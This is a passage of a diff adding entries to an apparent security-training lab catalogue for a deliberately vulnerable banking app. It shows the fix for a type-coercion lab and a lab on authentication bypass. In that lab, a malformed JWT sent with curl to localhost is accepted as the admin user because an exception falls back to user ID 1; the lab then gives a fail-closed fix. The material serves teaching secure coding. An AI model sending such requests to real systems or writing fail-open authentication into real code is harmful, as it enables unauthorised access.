+      BigDecimal amount;
+      try {
+          amount = new BigDecimal(request.get("amount").toString());
+      } catch (NumberFormatException e) {
+          return ResponseEntity.badRequest().body(Map.of("error", "Invalid amount"));
+      }
+      ```
+    source: core/src/main/java/com/securebank/lab/a10/Lab24TypeCoercionController.java
+    anchors:
+      - "public ResponseEntity<?> send("
+
+  - id: 25
+    category: A10
+    categoryName: Mishandling of Exceptional Conditions
+    title: "Insecure Fallback: Auth Bypass on Exception"
+    severity: High
+    objective: >-
+      Send a malformed JWT to trigger the `except` fallback and get admin access.
+    exploit: |
+      ```bash
+      # Send a deliberately malformed token (not even valid base64)
+      curl -H "Authorization: Bearer THISISNOTAVALIDTOKEN" \
+        http://localhost:8080/api/a10/transfers/history
+      ```
+      The decode raises `JwtException`, the bare `except` swallows it, `user_id`
+      defaults to `1` (admin), and the response returns all transfers as admin.
+
+      ```bash
+      # Confirm: garbage token vs. no token
+      curl http://localhost:8080/api/a10/transfers/history                          # 401
+      curl -H "Authorization: Bearer garbage" http://localhost:8080/api/a10/transfers/history   # 200 as admin!
+      ```
+    hint: >-
+      Compare the two responses above. Which one is more dangerous?
+    fix: >-
+      Replace the fallback with an explicit rejection:
+
+      ```java
+      try {
+          payload = jwtService.decode(token);
+          userId = payload.userId();
+      } catch (io.jsonwebtoken.JwtException e) {
+          return ResponseEntity.status(401).body(Map.of("error", "Invalid token"));
+      }
+      ```
+
+      Never fail open. Exceptions in authentication logic must always fail closed.
+    source: core/src/main/java/com/securebank/core/security/AuthFilter.java
+    anchors:
+      - "Long userId = 1L;"
